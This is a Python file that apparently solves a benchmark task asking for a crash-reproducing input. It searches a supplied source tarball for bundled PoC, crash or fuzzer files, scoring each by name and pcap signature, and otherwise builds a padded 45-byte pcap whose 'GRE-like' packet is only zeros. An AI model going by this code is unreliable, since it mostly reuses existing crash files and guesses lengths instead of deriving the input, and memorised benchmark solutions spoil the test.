import tarfile
from typing import Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._extract_poc_from_tar(src_path)
        if poc is not None:
            return poc
        return self._fallback_poc()

    def _extract_poc_from_tar(self, src_path: str) -> Optional[bytes]:
        try:
            tar = tarfile.open(src_path, "r:*")
        except Exception:
            return None

        best_data: Optional[bytes] = None
        best_key: Optional[Tuple[int, int, int]] = None
        target_len = 45

        try:
            for member in tar.getmembers():
                if not member.isfile():
                    continue

                size = member.size
                # Skip empty or very large files
                if size <= 0 or size > 65536:
                    continue

                name_lower = member.name.lower()
                priority = 0

                # Path / name-based hints
                if "/poc" in name_lower or name_lower.startswith("poc"):
                    priority += 50
                if "poc" in name_lower:
                    priority += 50
                if "crash" in name_lower or "repro" in name_lower:
                    priority += 40
                if "id:" in name_lower or "id_" in name_lower:
                    priority += 35
                if "afl" in name_lower or "fuzz" in name_lower:
                    priority += 10
                if "test" in name_lower or "tests" in name_lower:
                    priority += 5
                if (
                    "input" in name_lower
                    or "packet" in name_lower
                    or "seed" in name_lower
                    or "pcap" in name_lower
                ):
                    priority += 20
                if name_lower.endswith(
                    (".pcap", ".pcapng", ".cap", ".bin", ".dat", ".pkt")
                ):
                    priority += 30

                try:
                    f = tar.extractfile(member)
                except Exception:
                    continue
                if f is None:
                    continue

                try:
                    data = f.read()
                except Exception:
                    continue

                if not data:
                    continue

                # Determine if file is binary-like
                text_chars = set(range(0x20, 0x7F))
                text_chars.update({7, 8, 9, 10, 12, 13, 27})
                nontext = sum(1 for b in data if b not in text_chars)
                is_binary = nontext > 0
                if is_binary:
                    priority += 10

                # PCAP magic numbers
                if len(data) >= 4 and data[:4] in (
                    b"\xd4\xc3\xb2\xa1",
                    b"\xa1\xb2\xc3\xd4",
                    b"\x4d\x3c\xb2\xa1",
                    b"\xa1\xb2\x3c\x4d",
                ):
                    priority += 40

                diff = abs(size - target_len)
                # Higher priority first, then closer to target length, then smaller size
                key = (priority, -diff, -size)

                if best_key is None or key > best_key:
                    best_key = key
                    best_data = data
        finally:
            try:
                tar.close()
            except Exception:
                pass

        return best_data

    def _fallback_poc(self) -> bytes:
        # Construct a 45-byte PCAP file with a tiny packet as a generic fallback
        hdr = bytearray()

        # Global header (24 bytes, little-endian)
        hdr += b"\xd4\xc3\xb2\xa1"  # magic number
        hdr += b"\x02\x00"          # version major
        hdr += b"\x04\x00"          # version minor
        hdr += b"\x00\x00\x00\x00"  # thiszone
        hdr += b"\x00\x00\x00\x00"  # sigfigs
        hdr += b"\xff\xff\x00\x00"  # snaplen
        hdr += b"\x01\x00\x00\x00"  # network (Ethernet)

        # Packet header (16 bytes)
        hdr += b"\x00\x00\x00\x00"  # ts_sec
        hdr += b"\x00\x00\x00\x00"  # ts_usec
        hdr += b"\x05\x00\x00\x00"  # incl_len = 5
        hdr += b"\x05\x00\x00\x00"  # orig_len = 5

        # Packet data (5 bytes) - minimal GRE-like header + 1 byte payload
        hdr += b"\x00\x00\x00\x00\x00"

        # Ensure exact length of 45 bytes
        if len(hdr) < 45:
            hdr += b"\x00" * (45 - len(hdr))
        elif len(hdr) > 45:
            hdr = hdr[:45]

        return bytes(hdr)
